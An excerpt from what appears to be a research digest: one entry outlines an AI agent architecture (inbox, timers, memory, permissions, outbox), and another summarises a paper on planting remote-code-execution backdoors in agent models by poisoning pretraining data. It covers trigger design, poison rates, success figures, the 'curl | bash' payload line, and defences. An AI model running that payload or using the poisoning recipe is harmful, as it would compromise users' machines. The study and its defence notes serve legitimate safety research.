Five primitives, each its own durable store or service: an event inbox (every trigger appends a row; fast-ack handler; inbox as source of truth so crashed runs retry; one worker per inbox; batch pending events; dedupe by source ID), timers (follow-ups vs schedules in a separate store; a polling scheduler enqueues events, never starts runs), memory (files on durable storage; only what can't be looked up again, pointers otherwise; user instructions, user notes, past messages, per-task progress; optional dreaming), permissions (credential-injecting proxy outside the agent, classifier-backed auto mode, deferred tool calls that end the run and resume when the answer arrives as an inbox event) and an outbox (send / nothing / defer; a table plus dispatcher for pacing and retries; eval message volume, start quiet).   18. 2026-11-12R053Agentic backdoors via pretraining poisoningAn outside attacker who only gets web text into the pretraining crawl plants a remote code execution backdoor (`curl -sSL <url> | bash`) that survives a fully clean SFT, DPO and GRPO agent pipeline. Qwen3 0.6B/1.7B/4B pretrained from scratch on 100B FineWeb tokens: at 0.1% poison the 4B CLI agent fires on 92.7% (Pass@32) of prompts whose file paths contain a provider name (an ordinary-string trigger the victim's own machine supplies, generalizing to unseen paths) and 10.5% with an injected rare string; 0.0% on clean prompts and no capability loss. ASR rises monotonically with size; still 1.4% at 0.0005% (about 2,500 documents). Declaration poison (prose that states the rule, like a commit message) beats chat-transcript demonstrations (92.7% vs 3.2%) and is harder to filter. Defense: guard the action (sandbox, least privilege, egress, allow-lists, confirmation, pre-execution classifiers). Caveats: small models only, one fixed payload, single-seed low-rate runs, defenses not evaluated.
